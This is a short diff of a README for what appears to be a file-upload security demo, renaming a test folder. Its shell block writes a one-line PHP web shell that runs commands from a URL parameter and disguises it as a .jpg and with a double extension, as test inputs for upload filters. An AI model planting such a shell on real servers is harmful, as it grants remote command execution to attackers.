@@ -13,7 +13,7 @@ node secure.js         # http://localhost:3001
 
 ## Test files
 ```bash
-mkdir t && cd t
+mkdir test_files && cd test_files
 echo '<?php system($_GET["c"]); ?>' > shell.php
 cp shell.php fake.jpg              # PHP code disguised as .jpg
 cp shell.php shell.php.jpg         # double extension
